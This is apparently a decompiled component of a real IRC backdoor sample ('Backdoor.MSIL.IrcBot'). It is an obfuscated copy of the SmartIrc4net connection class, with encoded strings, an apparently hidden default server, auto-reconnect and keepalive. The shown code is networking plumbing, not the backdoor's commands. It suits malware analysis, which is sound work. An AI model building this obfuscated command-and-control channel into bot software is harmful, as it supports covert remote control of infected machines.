// Decompiled with JetBrains decompiler
// Type: Meebey.SmartIrc4net.IrcConnection
// Assembly: TheBot, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7E6D888C-8D83-46CE-907A-18F99381A0FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Backdoor.MSIL.IrcBot.an-523fbc7f8f4234f5b7e59adb51579626a43c55d41ac674e758828414fbdebd93.exe

using System;
using System.Collections;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;

namespace Meebey.SmartIrc4net
{
  public class IrcConnection
  {
    private string \uE024;
    private string \uE023;
    private string[] \uE022 = new string[1]
    {
      \uE01B.\uE000("\uF7F2\uF7F1\uF7FD\uF7FF\uF7F2\uF7F6\uF7F1\uF7ED\uF7EA", 63390)
    };
    private int \uE021;
    private int \uE020 = 6667;
    private StreamReader \uE01F;
    private StreamWriter \uE01E;
    private IrcConnection.ReadThread \uE01D;
    private IrcConnection.WriteThread \uE01C;
    private IrcConnection.IdleWorkerThread \uE01B;
    private \uE013 \uE01A;
    private Hashtable \uE019 = Hashtable.Synchronized(new Hashtable());
    private int \uE018 = 200;
    private bool \uE017;
    private bool \uE016;
    private bool \uE015;
    private int \uE014;
    private bool \uE013;
    private int \uE012 = 30;
    private bool \uE011;
    private Encoding \uE010 = Encoding.Default;
    private int \uE00F = 600;
    private int \uE00E = 600;
    private int \uE00D = 60;
    private int \uE00C = 60;
    private int \uE00B = 300;
    private DateTime \uE00A;
    private DateTime \uE009;
    private TimeSpan \uE008;

    public event ReadLineEventHandler OnReadLine;

    public event WriteLineEventHandler OnWriteLine;

    public event EventHandler OnConnecting;

    public event EventHandler OnConnected;

    public event EventHandler OnDisconnecting;

    public event EventHandler OnDisconnected;

    public event EventHandler OnConnectionError;

    public event AutoConnectErrorEventHandler OnAutoConnectError;

    protected bool IsConnectionError
    {
      get
      {
        lock (this)
          return this.\uE015;
      }
      set
      {
        lock (this)
          this.\uE015 = value;
      }
    }

    public string Address => this.\uE022[this.\uE021];

    public string[] AddressList => this.\uE022;

    public int Port => this.\uE020;

    public bool AutoReconnect
    {
      get => this.\uE011;
      set => this.\uE011 = value;
    }

    public bool AutoRetry
    {
      get => this.\uE013;
      set => this.\uE013 = value;
    }

    public int AutoRetryDelay
    {
      get => this.\uE012;
      set => this.\uE012 = value;
    }

    public int SendDelay
    {
      get => this.\uE018;
      set => this.\uE018 = value;
    }

    public bool IsRegistered => this.\uE017;

    public bool IsConnected => this.\uE016;

    public string VersionNumber => this.\uE024;

    public string VersionString => this.\uE023;

    public Encoding Encoding
    {
      get => this.\uE010;
      set => this.\uE010 = value;
    }

    public int SocketReceiveTimeout
    {
      get => this.\uE00F;
      set => this.\uE00F = value;
    }

    public int SocketSendTimeout
    {
      get => this.\uE00E;
      set => this.\uE00E = value;
    }

    public int IdleWorkerInterval
    {
      get => this.\uE00D;
      set => this.\uE00D = value;
    }

    public int PingInterval
    {
      get => this.\uE00C;
      set => this.\uE00C = value;
    }

    public int PingTimeout
    {
      get => this.\uE00B;
      set => this.\uE00B = value;
    }

    public TimeSpan Lag => this.\uE008;

    public IrcConnection()
    {
      this.\uE019[(object) Priority.High] = (object) System.Collections.Queue.Synchronized(new System.Collections.Queue());
      this.\uE019[(object) Priority.AboveMedium] = (object) System.Collections.Queue.Synchronized(new System.Collections.Queue());
      this.\uE019[(object) Priority.Medium] = (object) System.Collections.Queue.Synchronized(new System.Collections.Queue());
      this.\uE019[(object) Priority.BelowMedium] = (object) System.Collections.Queue.Synchronized(new System.Collections.Queue());
      this.\uE019[(object) Priority.Low] = (object) System.Collections.Queue.Synchronized(new System.Collections.Queue());
      this.\uE007 += new ReadLineEventHandler(this.\uE000);
      this.\uE001 += new EventHandler(this.\uE000);
      this.\uE01D = new IrcConnection.ReadThread(this);
      this.\uE01C = new IrcConnection.WriteThread(this);
      this.\uE01B = new IrcConnection.IdleWorkerThread(this);
      Assembly assembly = Assembly.GetAssembly(this.GetType());
      AssemblyName name = assembly.GetName(false);
      AssemblyProductAttribute customAttribute = (AssemblyProductAttribute) assembly.GetCustomAttributes(typeof (AssemblyProductAttribute), false)[0];
      this.\uE024 = name.Version.ToString();
      this.\uE023 = customAttribute.Product + \uE01B.\uE000("\uE372", 58194) + this.\uE024;
    }

    public void Connect(string[] addresslist, int port)
    {
      if (this.\uE016)
        throw new AlreadyConnectedException(\uE01B.\uE000("\uF7FC\uF7D1\uF7CF\uF7D8\uF7DC\uF7D9\uF7C4\uF79D\uF7DE\uF7D2\uF7D3\uF7D3\uF7D8\uF7DE\uF7C9\uF7D8\uF7D9\uF79D\uF7C9\uF7D2\uF787\uF79D", 63421) + this.Address + \uE01B.\uE000("\uF0B3", 61577) + (object) this.Port);
      ++this.\uE014;
      this.\uE022 = (string[]) addresslist.Clone();
      this.\uE020 = port;
      if (this.\uE005 != null)
        this.\uE005((object) this, EventArgs.Empty);
      try
      {
        IPAddress address = Dns.GetHostEntry(this.Address).AddressList[0];
        this.\uE01A = new \uE013();
        this.\uE01A.NoDelay = true;
        this.\uE01A.\uE000.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, 1);
        this.\uE01A.ReceiveTimeout = this.\uE00F * 1000;
        this.\uE01A.SendTimeout = this.\uE00E * 1000;
        this.\uE01A.Connect(address, port);
        this.\uE01F = new StreamReader((Stream) this.\uE01A.GetStream(), this.\uE010);
        this.\uE01E = new StreamWriter((Stream) this.\uE01A.GetStream(), this.\uE010);
        if (this.\uE010.GetPreamble().Length > 0)
          this.\uE01E.WriteLine();
        this.\uE014 = 0;
        this.IsConnectionError = false;
        this.\uE016 = true;
        this.\uE01D.Start();
        this.\uE01C.Start();
        this.\uE01B.Start();
        if (this.\uE004 == null)
          return;
        this.\uE004((object) this, EventArgs.Empty);
      }
      catch (Exception ex1)
      {
        if (this.\uE01F != null)
        {
          try
          {
            this.\uE01F.Close();
          }
          catch (ObjectDisposedException ex2)
          {
          }
        }
        if (this.\uE01E != null)
        {
          try
          {
            this.\uE01E.Close();
          }
          catch (ObjectDisposedException ex3)
          {
          }
        }
        if (this.\uE01A != null)
          this.\uE01A.Close();
        this.\uE016 = false;
        this.IsConnectionError = true;
        if (this.\uE013 && this.\uE014 <= 3)
        {
          if (this.\uE000 != null)
            this.\uE000((object) this, new AutoConnectErrorEventArgs(this.Address, this.Port, ex1));
          Thread.Sleep(this.\uE012 * 1000);
          this.\uE000();
          this.Connect(this.\uE022, this.\uE020);
        }
        else
          throw new CouldNotConnectException(\uE01B.\uE000("\uEE5B\uEE77\uEE6D\uEE74\uEE7C\uEE38\uEE76\uEE77\uEE6C\uEE38\uEE7B\uEE77\uEE76\uEE76\uEE7D\uEE7B\uEE6C\uEE38\uEE6C\uEE77\uEE22\uEE38", 60952) + this.Address + \uE01B.\uE000("\uF0B3", 61577) + (object) this.Port + \uE01B.\uE000("\uE372", 58194) + ex1.Message, ex1);
      }
    }

    public void Connect(string address, int port) => this.Connect(new string[1]
    {
      address
    }, port);

    public void Reconnect()
    {
      this.Disconnect();
      this.Connect(this.\uE022, this.\uE020);
    }

    public void Disconnect()
    {
      if (!this.IsConnected)
        throw new NotConnectedException(\uE01B.\uE000("\uF5A4\uF598\uF595\uF5D0\uF593\uF59F\uF59E\uF59E\uF595\uF593\uF584\uF599\uF59F\uF59E\uF5D0\uF593\uF59F\uF585\uF59C\uF594\uF5D0\uF59E\uF59F\uF584\uF5D0\uF592\uF595\uF5D0\uF594\uF599\uF583\uF593\uF59F\uF59E\uF59E\uF595\uF593\uF584\uF595\uF594\uF5D0\uF592\uF595\uF593\uF591\uF585\uF583\uF595\uF5D0\uF584\uF598\uF595\uF582\uF595\uF5D0\uF599\uF583\uF5D0\uF59E\uF59F\uF5D0\uF591\uF593\uF584\uF599\uF586\uF595\uF5D0\uF593\uF59F\uF59E\uF59E\uF595\uF593\uF584\uF599\uF59F\uF59E", 62960));
      if (this.\uE003 != null)
        this.\uE003((object) this, EventArgs.Empty);
      this.\uE01D.Stop();
      this.\uE01C.Stop();
      this.\uE01A.Close();
      this.\uE016 = false;
      this.\uE017 = false;
      if (this.\uE002 == null)
        return;
      this.\uE002((object) this, EventArgs.Empty);
    }

    public void Listen(bool blocking)
    {
      if (blocking)
      {
        while (this.IsConnected)
          this.ReadLine(true);
      }
      else
      {
        do
          ;
        while (this.ReadLine(false).Length > 0);
      }
    }

    public void Listen() => this.Listen(true);

    public void ListenOnce(bool blocking) => this.ReadLine(blocking);

    public void ListenOnce() => this.ListenOnce(true);

    public string ReadLine(bool blocking)
    {
      string str = "";
      if (blocking)
      {
        while (this.IsConnected && !this.IsConnectionError && this.\uE01D.Queue.Count == 0)
          Thread.Sleep(10);
      }
      if (this.IsConnected && this.\uE01D.Queue.Count > 0)
        str = (string) this.\uE01D.Queue.Dequeue();
      switch (str)
      {
        case null:
          if (this.IsConnectionError && this.\uE001 != null)
            this.\uE001((object) this, EventArgs.Empty);
          return str;
        default:
          if (str.Length > 0 && this.\uE007 != null)
          {
            this.\uE007((object) this, new ReadLineEventArgs(str));
            goto case null;
          }
          else
            goto case null;
      }
    }

    public void WriteLine(string data, Priority priority)
    {
      if (priority == Priority.Critical)
      {
        if (!this.IsConnected)
          throw new NotConnectedException();
        this.\uE000(data);
      }
      else
        ((System.Collections.Queue) this.\uE019[(object) priority]).Enqueue((object) data);
    }

    public void WriteLine(string data) => this.WriteLine(data, Priority.Medium);

    private bool \uE000(string _param1)
    {
      if (!this.IsConnected)
        return false;
      try
      {
        this.\uE01E.Write(_param1 + \uE01B.\uE000("\uEDBD\uEDBA", 60848));
        this.\uE01E.Flush();
      }
      catch (IOException ex)
      {
        this.IsConnectionError = true;
        return false;
      }
      catch (ObjectDisposedException ex)
      {
        this.IsConnectionError = true;
        return false;
      }
      if (this.\uE006 != null)
        this.\uE006((object) this, new WriteLineEventArgs(_param1));
      return true;
    }

    private void \uE000()
    {
      this.\uE021++;
      if (this.\uE021 < this.\uE022.Length)
        return;
      this.\uE021 = 0;
    }

    private void \uE000(object _param1, ReadLineEventArgs _param2)
    {
      string line = _param2.Line;
      string[] strArray = line.Split(' ');
      if (line[0] == ':')
      {
        string s = strArray[1];
        ReplyCode replyCode = ReplyCode.Null;
        try
        {
          replyCode = (ReplyCode) int.Parse(s);
        }
        catch (FormatException ex)
        {
        }
        switch (replyCode)
        {
          case ReplyCode.Null:
            string str;
            if ((str = strArray[1]) == null || !(str == \uE01B.\uE000("\uF05F\uF040\uF041\uF048", 61455)))
              break;
            DateTime now = DateTime.Now;
            this.\uE009 = now;
            this.\uE008 = now - this.\uE00A;
            break;
          case ReplyCode.Welcome:
            this.\uE017 = true;
            break;
        }
      }
      else
      {
        string str;
        if ((str = strArray[0]) == null || !(str == \uE01B.\uE000("\uE7C5\uE7D2\uE7D2\uE7CF\uE7D2", 59264)))
          return;
        this.IsConnectionError = true;
      }
    }

    private void \uE000(object _param1, EventArgs _param2)
    {
      try
      {
        if (this.AutoReconnect)
          this.Reconnect();
        else
          this.Disconnect();
      }
      catch (ConnectionException ex)
      {
      }
    }

    private class ReadThread
    {
      private IrcConnection \uE002;
      private Thread \uE001;
      private System.Collections.Queue \uE000 = System.Collections.Queue.Synchronized(new System.Collections.Queue());

      public System.Collections.Queue Queue => this.\uE000;

      public ReadThread(IrcConnection connection) => this.\uE002 = connection;

      public void Start()
      {
        this.\uE001 = new Thread(new ThreadStart(this.\uE000));
        this.\uE001.Name = \uE01B.\uE000("\uEA79\uEA4E\uEA4A\uEA4F\uEA7F\uEA43\uEA59\uEA4E\uEA4A\uEA4F\uEA0B\uEA03", 59947) + this.\uE002.Address + \uE01B.\uE000("\uF0B3", 61577) + (object) this.\uE002.Port + \uE01B.\uE000("\uF881", 63656);
        this.\uE001.IsBackground = true;
        this.\uE001.Start();
      }

      public void Stop()
      {
        this.\uE001.Abort();
        try
        {
          this.\uE002.\uE01F.Close();
        }
        catch (ObjectDisposedException ex)
        {
        }
      }

      private void \uE000()
      {
        try
        {
          try
          {
            string str;
            while (this.\uE002.IsConnected && (str = this.\uE002.\uE01F.ReadLine()) != null)
              this.\uE000.Enqueue((object) str);
          }
          catch
          {
          }
          finally
          {
            this.\uE002.IsConnectionError = true;
          }
        }
        catch (ThreadAbortException ex)
        {
          Thread.ResetAbort();
        }
      }
    }

    private class WriteThread
    {
      private IrcConnection \uE00D;
      private Thread \uE00C;
      private int \uE00B;
      private int \uE00A;
      private int \uE009;
      private int \uE008;
      private int \uE007;
      private int \uE006;
      private int \uE005;
      private int \uE004;
      private int \uE003 = 4;
      private int \uE002 = 2;
      private int \uE001 = 1;
      private int \uE000;

      public WriteThread(IrcConnection connection) => this.\uE00D = connection;

      public void Start()
      {
        this.\uE00C = new Thread(new ThreadStart(this.\uE005));
        this.\uE00C.Name = \uE01B.\uE000("\uE175\uE150\uE14B\uE156\uE147\uE176\uE14A\uE150\uE147\uE143\uE146\uE102\uE10A", 57634) + this.\uE00D.Address + \uE01B.\uE000("\uF0B3", 61577) + (object) this.\uE00D.Port + \uE01B.\uE000("\uF881", 63656);
        this.\uE00C.IsBackground = true;
        this.\uE00C.Start();
      }

      public void Stop()
      {
        this.\uE00C.Abort();
        try
        {
          this.\uE00D.\uE01E.Close();
        }
        catch (ObjectDisposedException ex)
        {
        }
      }

      private void \uE005()
      {
        try
        {
          try
          {
            while (this.\uE00D.IsConnected)
            {
              this.\uE000();
              Thread.Sleep(this.\uE00D.\uE018);
            }
          }
          catch
          {
          }
          finally
          {
            this.\uE00D.IsConnectionError = true;
          }
        }
        catch (ThreadAbortException ex)
        {
          Thread.ResetAbort();
        }
      }

      private void \uE000()
      {
        if (!this.\uE00D.\uE017)
          return;
        this.\uE00B = ((System.Collections.Queue) this.\uE00D.\uE019[(object) Priority.High]).Count;
        this.\uE00A = ((System.Collections.Queue) this.\uE00D.\uE019[(object) Priority.AboveMedium]).Count;
        this.\uE009 = ((System.Collections.Queue) this.\uE00D.\uE019[(object) Priority.Medium]).Count;
        this.\uE008 = ((System.Collections.Queue) this.\uE00D.\uE019[(object) Priority.BelowMedium]).Count;
        this.\uE007 = ((System.Collections.Queue) this.\uE00D.\uE019[(object) Priority.Low]).Count;
        if (this.\uE004() && this.\uE003() && this.\uE002() && this.\uE001() && this.\uE000())
        {
          this.\uE006 = 0;
          this.\uE005 = 0;
          this.\uE004 = 0;
          this.\uE000 = 0;
        }
        if (this.\uE000 >= 3)
          return;
        ++this.\uE000;
      }

      private bool \uE004()
      {
        if (this.\uE00B > 0)
        {
          string str = (string) ((System.Collections.Queue) this.\uE00D.\uE019[(object) Priority.High]).Dequeue();
          if (!this.\uE00D.\uE000(str))
            ((System.Collections.Queue) this.\uE00D.\uE019[(object) Priority.High]).Enqueue((object) str);
          if (this.\uE00B > 1)
            return false;
        }
        return true;
      }

      private bool \uE003()
      {
        if (this.\uE00A > 0 && this.\uE006 < this.\uE003)
        {
          string str = (string) ((System.Collections.Queue) this.\uE00D.\uE019[(object) Priority.AboveMedium]).Dequeue();
          if (!this.\uE00D.\uE000(str))
            ((System.Collections.Queue) this.\uE00D.\uE019[(object) Priority.AboveMedium]).Enqueue((object) str);
          ++this.\uE006;
          if (this.\uE006 < this.\uE003)
            return false;
        }
        return true;
      }

      private bool \uE002()
      {
        if (this.\uE009 > 0 && this.\uE005 < this.\uE002)
        {
          string str = (string) ((System.Collections.Queue) this.\uE00D.\uE019[(object) Priority.Medium]).Dequeue();
          if (!this.\uE00D.\uE000(str))
            ((System.Collections.Queue) this.\uE00D.\uE019[(object) Priority.Medium]).Enqueue((object) str);
          ++this.\uE005;
          if (this.\uE005 < this.\uE002)
            return false;
        }
        return true;
      }

      private bool \uE001()
      {
        if (this.\uE008 > 0 && this.\uE004 < this.\uE001)
        {
          string str = (string) ((System.Collections.Queue) this.\uE00D.\uE019[(object) Priority.BelowMedium]).Dequeue();
          if (!this.\uE00D.\uE000(str))
            ((System.Collections.Queue) this.\uE00D.\uE019[(object) Priority.BelowMedium]).Enqueue((object) str);
          ++this.\uE004;
          if (this.\uE004 < this.\uE001)
            return false;
        }
        return true;
      }

      private bool \uE000()
      {
        if (this.\uE007 > 0 && this.\uE00B <= 0 && this.\uE00A <= 0 && this.\uE009 <= 0 && this.\uE008 <= 0)
        {
          string str = (string) ((System.Collections.Queue) this.\uE00D.\uE019[(object) Priority.Low]).Dequeue();
          if (!this.\uE00D.\uE000(str))
            ((System.Collections.Queue) this.\uE00D.\uE019[(object) Priority.Low]).Enqueue((object) str);
          if (this.\uE007 > 1)
            return false;
        }
        return true;
      }
    }

    private class IdleWorkerThread
    {
      private IrcConnection \uE001;
      private Thread \uE000;

      public IdleWorkerThread(IrcConnection connection) => this.\uE001 = connection;

      public void Start()
      {
        DateTime now = DateTime.Now;
        this.\uE001.\uE00A = now;
        this.\uE001.\uE009 = now;
        this.\uE000 = new Thread(new ThreadStart(this.\uE000));
        this.\uE000.Name = \uE01B.\uE000("\uE0F5\uE0D8\uE0D0\uE0D9\uE0EB\uE0D3\uE0CE\uE0D7\uE0D9\uE0CE\uE0E8\uE0D4\uE0CE\uE0D9\uE0DD\uE0D8\uE09C\uE094", 57532) + this.\uE001.Address + \uE01B.\uE000("\uF0B3", 61577) + (object) this.\uE001.Port + \uE01B.\uE000("\uF881", 63656);
        this.\uE000.IsBackground = true;
        this.\uE000.Start();
      }

      public void Stop() => this.\uE000.Abort();

      private void \uE000()
      {
        try
        {
          while (this.\uE001.IsConnected)
          {
            if (this.\uE001.IsRegistered)
            {
              DateTime now = DateTime.Now;
              int totalSeconds1 = (int) (now - this.\uE001.\uE00A).TotalSeconds;
              int totalSeconds2 = (int) (now - this.\uE001.\uE009).TotalSeconds;
              if (totalSeconds1 < this.\uE001.\uE00B)
              {
                if (totalSeconds2 > this.\uE001.\uE00C)
                {
                  this.\uE001.WriteLine(Rfc2812.Ping(this.\uE001.Address), Priority.Critical);
                  this.\uE001.\uE00A = now;
                  this.\uE001.\uE009 = now;
                }
              }
              else
              {
                this.\uE001.IsConnectionError = true;
                break;
              }
            }
            Thread.Sleep(this.\uE001.\uE00D);
          }
        }
        catch (ThreadAbortException ex)
        {
          Thread.ResetAbort();
        }
      }
    }
  }
}
